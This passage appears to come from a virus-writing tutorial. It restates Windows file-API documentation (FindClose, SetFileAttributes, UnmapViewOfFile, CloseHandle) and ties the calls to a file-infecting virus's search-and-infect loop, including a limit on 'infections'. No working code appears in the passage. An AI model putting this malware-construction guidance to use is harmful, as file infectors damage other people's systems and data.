style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                 </span><span style="mso-spacerun:
yes">                                                            </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>Parameters<span style="mso-spacerun:
yes">                                                                </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>hFindFile: Identifies a search handle returned by a previous call
to<span style="mso-spacerun: yes">   </span>the FindFirstFile function.<span
style="mso-spacerun: yes">               </span><span style="mso-spacerun:
yes">                              </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>lpFindFileData: Points to the WIN32_FIND_DATA structure that receives
information about the found file or subdirectory. The structure can be used in
subsequent calls to FindNextFile to refer to the found file or<span
style="mso-spacerun: yes">   </span>directory.<span style="mso-spacerun:
yes">                                                              </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>Return Values<span style="mso-spacerun: yes">                  </span><span
style="mso-spacerun: yes">                                           </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes"> 
</span>If the function succeeds, the return value is nonzero.<span
style="mso-spacerun: yes">                  </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>If the function fails, the return value is zero. To get extended
error<span style="mso-spacerun: yes">  </span>information, call
GetLastError<span style="mso-spacerun:
yes">                                          </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>If<span style="mso-spacerun: yes">  </span>no matching files<span
style="mso-spacerun: yes">  </span>can be found, the GetLastError function
returns ERROR_NO_MORE_FILES.<span style="mso-spacerun: yes">                                                   
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                  </span><span style="mso-spacerun:
yes">                                                           </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>If the FindNextFile returned error, or if the virus has reached the
maximum number of infections possible,we arrive to the last routine of this
block. It consist in closing the search handle with the FindClose API.<span
style="mso-spacerun: yes">   </span>As usual, here comes the description of
such API:<span style="mso-spacerun: yes">                         </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                        </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'>----------------------------------------------------------------------------------------------<span
style="mso-spacerun: yes">                                      </span><span
style="mso-spacerun: yes">                                 </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                     </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>The FindClose function closes the specified search handle. The
FindFirstFile and FindNextFile functions use the search handle to locate<span
style="mso-spacerun: yes">   </span>files with names that match a given
name.<span style="mso-spacerun: yes">                                 </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>BOOL FindClose(<span style="mso-spacerun:
yes">                                                           </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>HANDLE hFindFile<span style="mso-spacerun: yes">    </span>// file
search handle<span style="mso-spacerun: yes">      </span><span
style="mso-spacerun: yes">                         </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>)<span style="mso-spacerun:
yes">                                                                       
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                         
</span><span style="mso-spacerun: yes">   </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>Parameters<span style="mso-spacerun:
yes">                                                                </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>hFindFile: Identifies the search handle. This handle must have been
previously opened by the FindFirstFile function.<span style="mso-spacerun:
yes">                        </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                             </span><span style="mso-spacerun:
yes">                                                </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>Return Values<span style="mso-spacerun:
yes">                                                             </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes"> 
</span>If the function succeeds, the return value is nonzero.<span
style="mso-spacerun: yes">                  </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                      </span><span
style="mso-spacerun: yes">                       </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>If the function fails, the return value is zero. To get extended
error<span style="mso-spacerun: yes">   </span>information, call
GetLastError<span style="mso-spacerun:
yes">                                          </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'>----------------------------------------------------------------------------------------------<span
style="mso-spacerun:
yes">                                                                      
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes"> 
</span>The SetFileAttributes function sets a file's attributes.<span
style="mso-spacerun: yes">                  </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                </span><span style="mso-spacerun:
yes">                                                             </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>BOOL SetFileAttributes(<span style="mso-spacerun:
yes">                                                   </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>LPCTSTR lpFileName, // address of filename<span style="mso-spacerun:
yes">                              </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>DWORD dwFileAttributes<span style="mso-spacerun: yes">      </span>// address
of attributes to set<span style="mso-spacerun: yes">             </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>)<span style="mso-spacerun:
yes">                                                                       
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>Parameters<span style="mso-spacerun:
yes">                                               </span><span
style="mso-spacerun: yes">                 </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>lpFileName: Points to a string that specifies da name of da file
whose<span style="mso-spacerun: yes">  </span>attributes are to be set.<span
style="mso-spacerun: yes">                                              
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>dwFileAttributes: Specifies da file attributes to set for da file.This
parameter can be a combination of the following values. However, all<span
style="mso-spacerun: yes">   </span>other values override
FILE_ATTRIBUTE_NORMAL.<span style="mso-spacerun: yes">                           
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                </span><span
style="mso-spacerun: yes">                             </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>Return Values<span style="mso-spacerun:
yes">                                                             </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>If the function succeeds, the return value is nonzero.<span
style="mso-spacerun: yes">                  </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                       
</span><span style="mso-spacerun: yes">     </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>If the function fails, the return value is zero. To get extended
error<span style="mso-spacerun: yes">  </span>information, call
GetLastError<span style="mso-spacerun:
yes">                                          </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>After set the new attributes, we open the file, and, if no error
happened, it stores the handle in its variable.<span style="mso-spacerun:
yes">                                </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'>----------------------------------------------------------------------------------------------<span
style="mso-spacerun: yes">                                    </span><span
style="mso-spacerun: yes">                                   </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes"> 
</span>The UnmapViewOfFile function unmaps a mapped view of a file from the
calling process's address space.<span style="mso-spacerun:
yes">                                          </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                        
</span><span style="mso-spacerun: yes">    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>BOOL UnmapViewOfFile(<span style="mso-spacerun:
yes">                                                     </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>LPCVOID lpBaseAddress<span style="mso-spacerun: yes">       </span>//
address where mapped view begins<span style="mso-spacerun: yes">        
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>)<span style="mso-spacerun:
yes">                                                                       
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                 </span><span style="mso-spacerun:
yes">                                                            </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>Parameters<span style="mso-spacerun:
yes">                                                                </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>lpBaseAddress: Points to the base address of the mapped view of a
file<span style="mso-spacerun: yes">  </span>that is to be unmapped. This value
must be identical to the value returned by a previous call to the MapViewOfFile
or MapViewOfFileEx<span style="mso-spacerun: yes">  </span>function.<span
style="mso-spacerun:
yes">                                                               </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>Return Values<span style="mso-spacerun:
yes">                                                             </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>If the function succeeds, the return value is nonzero, and all dirty
pages within the specified range are written &quot;lazily&quot; to disk.<span
style="mso-spacerun: yes">          </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                           </span><span
style="mso-spacerun: yes">                                  </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>If the function fails, the return value is zero. To get extended
error<span style="mso-spacerun: yes">  </span>information, call
GetLastError<span style="mso-spacerun:
yes">                                          </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                       
</span><span style="mso-spacerun: yes">     </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes"> 
</span>----------------------------------------------------------------------------------------------<span
style="mso-spacerun:
yes">                                                                      
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>The CloseHandle function closes an open object handle.<span
style="mso-spacerun: yes">                    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>BOOL CloseHandle(<span style="mso-spacerun:
yes">                                                         </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
